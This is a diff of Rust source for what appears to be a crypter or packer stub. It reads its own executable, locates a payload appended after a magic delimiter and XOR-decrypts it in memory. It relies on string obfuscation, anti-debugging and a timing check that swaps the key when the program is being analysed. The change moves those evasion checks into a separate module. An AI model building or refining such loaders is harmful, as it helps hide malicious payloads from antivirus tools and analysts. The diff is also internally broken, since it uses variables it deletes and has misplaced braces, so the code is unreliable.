@@ -10,33 +10,30 @@ use std::process::exit;
 use std::ptr;
 use obfstr::obfstr;
 
+mod security;
+
 const MAGIC_DELIMITER: &[u8] = &[0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xFF, 0xEE, 0x11];
 const PARTIAL_KEY: u8 = 0x55;
 const MAX_CYCLES: u64 = 50_000_000;
 
 fn main() {
     // 1. Anti-Debug
-    if is_being_debugged() { exit(0); }
-    let start_time = unsafe { get_time_cycles() };
-    let current_exe = env::current_exe().unwrap_or_else(|_| exit(0));
-    let mut file = File::open(current_exe).unwrap_or_else(|_| exit(0));
-    let mut buffer = Vec::new();
-    file.read_to_end(&mut buffer).unwrap_or_else(|_| exit(0));
-    let delimiter_pos = buffer.windows(MAGIC_DELIMITER.len()).rposition(|w| w == MAGIC_DELIMITER);
-    let end_time = unsafe { get_time_cycles() };
-    // 2. Time Lock
-    let mut corrupted_mode = false;
-    if (end_time > start_time) && (end_time - start_time) > MAX_CYCLES {
-        corrupted_mode = true;
-    }
-    if let Some(pos) = delimiter_pos {
+    
+    let corrupted_mode = security::run_all_checks();
+
+    if let Some(pos) = delimiter_pos 
+    {
         let encrypted_data = &buffer[pos + MAGIC_DELIMITER.len()..];
-        
-        let final_key = if corrupted_mode { 
-            PARTIAL_KEY ^ 0xFF 
-        } else { 
-            PARTIAL_KEY 
+
+        let final_key = if corrupted_mode 
+        {
+            PARTIAL_KEY ^ 0xFF
+        } 
+        else 
+        {
+            PARTIAL_KEY
         };
+    }
 
         // 3. Déchiffrement en mémoire
         let decrypted: Vec<u8> = encrypted_data.iter().map(|&b| b ^ final_key).collect();
